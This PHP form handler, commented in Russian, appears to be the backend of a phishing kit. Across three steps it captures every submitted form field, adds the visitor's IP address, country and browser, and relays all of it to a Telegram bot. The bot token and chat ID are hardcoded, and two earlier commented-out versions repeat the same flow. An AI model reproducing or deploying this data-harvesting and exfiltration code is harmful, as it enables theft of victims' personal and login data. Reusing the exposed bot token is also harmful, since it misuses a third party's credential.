<?php
// session_start();

// $TELEGRAM_BOT_TOKEN = '6360968307:AAE3Vd-6Ac8NO9f3kclN6KM7xMnPbtMtjmY';
// $TELEGRAM_CHAT_ID = '1433249854';

// function sendToTelegram($message) {
//     $url = "https://api.telegram.org/bot" . $GLOBALS['TELEGRAM_BOT_TOKEN'] . "/sendMessage";
//     $data = [
//         'chat_id' => $GLOBALS['TELEGRAM_CHAT_ID'],
//         'text' => $message,
//     ];
//     $options = [
//         'http' => [
//             'header'  => "Content-type: application/json\r\n",
//             'method'  => 'POST',
//             'content' => json_encode($data),
//         ],
//     ];
//     $context  = stream_context_create($options);
//     $result = file_get_contents($url, false, $context);
//     if ($result === FALSE) { 
//         die("Error sending message to Telegram");
//     }
// }

// if (!isset($_SESSION['formData'])) {
//     $_SESSION['formData'] = [];
// }

// $currentStep = $_POST['step'];
// $stepData = [];

// foreach ($_POST as $key => $value) {
//     if ($key !== 'step') {
//         $stepData[$key] = htmlspecialchars($value);
//     }
// }

// $_SESSION['formData'][$currentStep] = $stepData;

// $message = "Данные с шага $currentStep:\n";
// foreach ($_SESSION['formData'] as $step => $data) {
//     $message .= "Шаг $step:\n";
//     foreach ($data as $key => $value) {
//         $message .= "$key: $value\n";
//     }
//     $message .= "\n";
// }

// sendToTelegram($message);

// if ($currentStep == 1) {
//     echo "<script>window.location.href = 'index.html#step2';</script>";
// } elseif ($currentStep == 2) {
//     echo "<script>window.location.href = 'index.html#step3';</script>";
// } elseif ($currentStep == 3) {
//     echo "<script>alert('Форма успешно завершена!');</script>";
//     session_destroy(); 
// }


// session_start();

// $TELEGRAM_BOT_TOKEN = '6360968307:AAE3Vd-6Ac8NO9f3kclN6KM7xMnPbtMtjmY';
// $TELEGRAM_CHAT_ID = '1433249854';

// // Функция для отправки сообщений в Telegram
// function sendToTelegram($message) {
//     global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
//     $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
//     $data = [
//         'chat_id' => $TELEGRAM_CHAT_ID,
//         'text' => $message,
//     ];
//     $options = [
//         'http' => [
//             'header'  => "Content-type: application/json\r\n",
//             'method'  => 'POST',
//             'content' => json_encode($data),
//         ],
//     ];
//     $context  = stream_context_create($options);
//     $result = file_get_contents($url, false, $context);
//     if ($result === FALSE) { 
//         die("Error sending message to Telegram");
//     }
// }

// // Функция для получения данных пользователя (IP и страна)
// function getUserData() {
//     $ip = $_SERVER['REMOTE_ADDR'];
//     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
//         $ip = $_SERVER['HTTP_CLIENT_IP'];
//     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
//         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
//     }

//     $userData = [];
//     if (filter_var($ip, FILTER_VALIDATE_IP)) {
//         $ipInfo = json_decode(file_get_contents("https://ipinfo.io/{$ip}/json"), true);
//         $userData['ip'] = $ip;
//         $userData['userAgent']['browser'] = isset($ipInfo['userAgent']['browser']) ? $ipInfo['userAgent']['browser'] : 'Unknown';
//         $userData['country'] = isset($ipInfo['country']) ? $ipInfo['country'] : 'Unknown';
//     } else {
//         $userData['ip'] = 'Unknown';
//         $userData['country'] = 'Unknown';
//         $userData['userAgent']['browser'] = 'Unknown';
//     }

//     return $userData;
// }

// if (!isset($_SESSION['formData'])) {
//     $_SESSION['formData'] = [];
// }

// $currentStep = $_POST['step'];
// $stepData = [];

// foreach ($_POST as $key => $value) {
//     if ($key !== 'step') {
//         $stepData[$key] = htmlspecialchars($value);
//     }
// }

// $_SESSION['formData'][$currentStep] = $stepData;

// $userData = getUserData();
// $_SESSION['userData'] = $userData; 


// $message = "";
// if ($currentStep == 1) {
//     $message .= "Данные с шага $currentStep:\n";
//     foreach ($stepData as $key => $value) {
//         $message .= "$key: $value\n";
//     }
//     $message .= "\nИнформация о пользователе:\n";
//     $message .= "IP: {$userData['ip']}\n";
//     $message .= "Страна: {$userData['country']}\n";
// } else {
//     $message .= "Данные с шага $currentStep:\n";
//     foreach ($stepData as $key => $value) {
//         $message .= "$key: $value\n";
//     }
//     $message .= "\nВсе собранные данные:\n";
//     foreach ($_SESSION['formData'] as $step => $data) {
//         $message .= "Шаг $step:\n";
//         foreach ($data as $key => $value) {
//             $message .= "$key: $value\n";
//         }
//         $message .= "\n";
//     }
//     if ($currentStep == 2) {
//         $message .= "Информация о пользователе:\n";
//         $message .= "IP: {$userData['ip']}\n";
//         $message .= "Страна: {$userData['country']}\n";
//     }
// }

// sendToTelegram($message);

// if ($currentStep == 1) {
//     echo "<script>window.location.href = 'index.html#step2';</script>";
// } elseif ($currentStep == 2) {
//     echo "<script>window.location.href = 'index.html#step3';</script>";
// } elseif ($currentStep == 3) {
//     echo "<script>alert('Форма успешно завершена!');</script>";
//     session_destroy();
// }

session_start();

$TELEGRAM_BOT_TOKEN = '6360968307:AAE3Vd-6Ac8NO9f3kclN6KM7xMnPbtMtjmY';
$TELEGRAM_CHAT_ID = '1433249854';

// Функция для отправки сообщений в Telegram
function sendToTelegram($message) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot" . $TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    if ($result === FALSE) { 
        die("Error sending message to Telegram");
    }
}

// Функция для получения данных пользователя (IP, страна, браузер)
function getUserData() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    $userData = [];
    if (filter_var($ip, FILTER_VALIDATE_IP)) {
        // Получаем информацию о стране через API ipinfo.io
        $ipInfo = json_decode(file_get_contents("https://ipinfo.io/{$ip}/json"), true);
        $userData['ip'] = $ip;
        $userData['country'] = isset($ipInfo['country']) ? $ipInfo['country'] : 'Unknown';
    } else {
        $userData['ip'] = 'Unknown';
        $userData['country'] = 'Unknown';
    }

    // Получаем информацию о браузере из заголовка User-Agent
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browserName = getBrowserName($userAgent);
    $userData['browser'] = $browserName;

    return $userData;
}

// Функция для получения имени браузера из User-Agent
function getBrowserName($userAgent) {
    if (strpos($userAgent, 'Opera') || strpos($userAgent, 'OPR/')) return 'Opera';
    elseif (strpos($userAgent, 'Edge')) return 'Edge';
    elseif (strpos($userAgent, 'Chrome')) return 'Chrome';
    elseif (strpos($userAgent, 'Safari')) return 'Safari';
    elseif (strpos($userAgent, 'Firefox')) return 'Firefox';
    elseif (strpos($userAgent, 'MSIE') || strpos($userAgent, 'Trident/7')) return 'Internet Explorer';

    return 'Other';
}

// Инициализация данных из сессии
if (!isset($_SESSION['formData'])) {
    $_SESSION['formData'] = [];
}

// Сбор данных с текущего шага
$currentStep = $_POST['step'];
$stepData = [];

foreach ($_POST as $key => $value) {
    if ($key !== 'step') {
        $stepData[$key] = htmlspecialchars($value);
    }
}

$_SESSION['formData'][$currentStep] = $stepData;

// Получаем данные пользователя (IP, страна, браузер)
$userData = getUserData();
$_SESSION['userData'] = $userData; // Сохраняем данные пользователя в сессию

// Отправка данных в Telegram
$message = "";
if ($currentStep == 1) {
    $message .= "Данные с шага $currentStep:\n";
    foreach ($stepData as $key => $value) {
        $message .= "$key: $value\n";
    }
    $message .= "\nИнформация о пользователе:\n";
    $message .= "IP: {$userData['ip']}\n";
    $message .= "Страна: {$userData['country']}\n";
    $message .= "Браузер: {$userData['browser']}\n";
} else {
    $message .= "Данные с шага $currentStep:\n";
    foreach ($stepData as $key => $value) {
        $message .= "$key: $value\n";
    }
    $message .= "\nВсе собранные данные:\n";
    foreach ($_SESSION['formData'] as $step => $data) {
        $message .= "Шаг $step:\n";
        foreach ($data as $key => $value) {
            $message .= "$key: $value\n";
        }
        $message .= "\n";
    }
    if ($currentStep == 2) {
        $message .= "\nИнформация о пользователе:\n";
        $message .= "IP: {$userData['ip']}\n";
        $message .= "Страна: {$userData['country']}\n";
        $message .= "Браузер: {$userData['browser']}\n";
    }
}

sendToTelegram($message);

// Переключение на следующий шаг
if ($currentStep == 1) {
    echo "<script>window.location.href = 'index.html#step2';</script>";
} elseif ($currentStep == 2) {
    echo "<script>window.location.href = 'index.html#step3';</script>";
} elseif ($currentStep == 3) {
    echo "<script>alert('Форма успешно завершена!');</script>";
    session_destroy(); // Очищаем сессию после завершения формы
}